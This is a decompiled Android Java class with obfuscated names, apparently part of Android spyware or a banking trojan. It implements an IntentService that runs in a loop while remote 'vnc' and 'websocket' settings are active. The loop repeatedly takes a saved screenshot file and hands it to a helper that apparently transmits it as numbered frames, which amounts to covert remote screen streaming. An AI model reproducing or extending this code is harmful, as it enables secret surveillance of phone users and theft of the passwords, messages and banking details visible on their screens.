package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.qvhy;

import android.app.IntentService;
import android.content.Intent;
import java.io.File;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.C0020b;

/* JADX INFO: loaded from: classes.dex */
public class nvsdtnxkzjgw extends IntentService {

    /* JADX INFO: renamed from: a */
    public int f567a;

    public nvsdtnxkzjgw() {
        super("nvsdtnxkzjgw");
        this.f567a = 0;
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        C0020b c0020b = new C0020b();
        if (c0020b.m251e(this, "vnc").equals("stop") || c0020b.m251e(this, "websocket").equals("")) {
            stopService(intent);
        }
        while (true) {
            try {
                try {
                    TimeUnit.MILLISECONDS.sleep(500L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            } catch (Exception unused) {
                c0020b.m230a("error", "Send screenshot");
            }
            if (c0020b.m251e(this, "vnc").equals("stop") || c0020b.m251e(this, "websocket").equals("")) {
                break;
            }
            c0020b.m229a(this, C0020b.m221a(new File(getExternalFilesDir(null), "screenshot.jpg")), this.f567a + ".jpg");
            this.f567a = this.f567a + 1;
            if (this.f567a >= 11) {
                this.f567a = 0;
            }
        }
        stopService(intent);
    }
}
